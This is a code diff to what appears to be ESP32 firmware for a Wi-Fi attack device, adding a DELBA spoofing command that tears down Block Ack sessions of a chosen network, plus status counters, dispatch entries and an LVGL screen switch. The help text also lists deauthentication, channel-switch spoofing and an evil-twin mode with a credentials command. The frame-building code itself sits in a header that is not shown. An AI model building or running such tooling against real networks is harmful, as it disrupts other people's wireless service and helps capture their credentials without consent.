@@ -11,6 +11,7 @@
 
 #include "csa.h"
 #include "deauth.h"
+#include "delba.h"
 
 // Auto CSA: per-round impersonation window on the announced channel.
 #define CSA_AUTO_HOLD_MS 500
@@ -100,11 +101,15 @@ void print_help() {
   Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
   Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
   Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
+  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/evil)");
   Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
   Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
   Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
   Serial.println("INFO CSASTOP                       stop the CSA spoof");
   Serial.println("INFO CSATEST                       dump the CSA action/beacon bytes (format check)");
+  Serial.println("INFO DELBA <idx> [reason]          DELBA spoof: tear down Block Ack sessions (1/32/37/38/39)");
+  Serial.println("INFO DELBASTOP                     stop the DELBA spoof");
+  Serial.println("INFO DELBATEST                     dump the DELBA action frame bytes (format check)");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO UIREASON / UI                 LVGL reason popup: open / report state");
 }
@@ -307,6 +312,28 @@ void do_status() {
   Serial.print((unsigned)csa_auth_replies());
   Serial.print(" csarej=");
   Serial.print((unsigned)csa_assoc_rejects());
+  Serial.print(" delba=");
+  Serial.print(delba_active() ? "on" : "off");
+  Serial.print(" delbaf=");
+  Serial.print((unsigned)delba_frames());
+  Serial.print(" delbac=");
+  Serial.print((unsigned)delba_clients());
+  Serial.print(" delbat=");
+  Serial.print((unsigned)delba_tid_mask());
+  Serial.print(" delbab=");
+  Serial.print((unsigned)delba_addba_seen());
+  Serial.print(" delbar=");
+  Serial.print((unsigned)delba_bar_seen());
+  Serial.print(" delbtr=");
+  Serial.print((unsigned)delba_triggered());
+  Serial.print(" delbb=");
+  Serial.print((unsigned)delba_blind_frames());
+  Serial.print(" delbrv=");
+  Serial.print((unsigned)delba_reverse_frames());
+  Serial.print(" rxaddba=");
+  Serial.print((unsigned)attack_rx_addba());
+  Serial.print(" rxdelba=");
+  Serial.print((unsigned)attack_rx_delba());
   Serial.print(" reason=");
   if (attack_reason_is_random()) {
     Serial.print("random");
@@ -442,6 +469,38 @@ void do_csa_stop() {
   csa_stop();
   Serial.printf("OK CSASTOP frames=%u\n", (unsigned)frames);
   ui_log("csa stopped");
+}
+
+// DELBA <idx> [reason]: tear down the Block Ack sessions of that BSS. Needs the
+// sniffer, so a running deauth/CSA attack is stopped first (one radio, one job).
+void do_delba(int index, uint16_t reason) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  if (!delba_reason_is_defined(reason)) {
+    Serial.println("ERR reason must be one of 1, 32, 37, 38, 39");
+    return;
+  }
+  attack_stop();
+  if (!delba_start(index, reason)) {
+    Serial.println("ERR cannot start DELBA on that network");
+    return;
+  }
+  Serial.printf("OK DELBA %d reason=%u ch=%u ssid=%s\n", index, (unsigned)reason,
+                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
+  ui_log("delba started");
+}
+
+void do_delba_stop() {
+  const uint32_t frames = delba_frames();
+  delba_stop();
+  Serial.printf("OK DELBASTOP frames=%u\n", (unsigned)frames);
+  ui_log("delba stopped");
+}
+
+void do_delba_test() {
+  delba_selftest();
 }
 
 void do_deauth_all(uint16_t reason) {
@@ -702,7 +761,11 @@ void do_rx_mix() {
   Serial.print(" csa_action=");
   Serial.print((unsigned)attack_rx_csa_action());
   Serial.print(" csa_ie=");
-  Serial.println((unsigned)attack_rx_csa_ie());
+  Serial.print((unsigned)attack_rx_csa_ie());
+  Serial.print(" addba=");
+  Serial.print((unsigned)attack_rx_addba());
+  Serial.print(" delba=");
+  Serial.println((unsigned)attack_rx_delba());
 }
 
 // REASON            -> report the current setting
@@ -750,6 +813,24 @@ void do_ui_state() {
   Serial.print(" nets=");
   Serial.println(g_scan_count);
 #else
+  Serial.println("ERR LVGL UI is not enabled in this build");
+#endif
+}
+
+void do_ui_screen(char* token) {
+#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
+  if (token == nullptr) {
+    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|evil>");
+    return;
+  }
+  if (!wireless_ui_show_by_name(token)) {
+    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba evil");
+    return;
+  }
+  Serial.print("OK UISCREEN ");
+  Serial.println(wireless_ui_screen_name());
+#else
+  (void)token;
   Serial.println("ERR LVGL UI is not enabled in this build");
 #endif
 }
@@ -813,6 +894,20 @@ void dispatch(char* line) {
     do_csa_stop();
   } else if (strcmp(command, "CSATEST") == 0) {
     do_csa_test();
+  } else if (strcmp(command, "DELBA") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* reason_token = strtok(nullptr, " \t");
+    const int delba_idx = parse_index(idx_token);
+    if (delba_idx < 0) {
+      Serial.println("ERR usage: DELBA <idx> [reason]");
+    } else {
+      const long reason = reason_token ? strtol(reason_token, nullptr, 10) : 37;
+      do_delba(delba_idx, (uint16_t)reason);
+    }
+  } else if (strcmp(command, "DELBASTOP") == 0) {
+    do_delba_stop();
+  } else if (strcmp(command, "DELBATEST") == 0) {
+    do_delba_test();
   } else if (strcmp(command, "MON") == 0) {
     char* ch_token = strtok(nullptr, " 	");
     char* sec_token = strtok(nullptr, " 	");
@@ -837,6 +932,8 @@ void dispatch(char* line) {
     do_ui_targets();
   } else if (strcmp(command, "UIREASON") == 0) {
     do_ui_reasons();
+  } else if (strcmp(command, "UISCREEN") == 0) {
+    do_ui_screen(strtok(nullptr, " 	"));
   } else if (strcmp(command, "UI") == 0) {
     do_ui_state();
   } else if (strcmp(command, "CALIBRATE") == 0) {
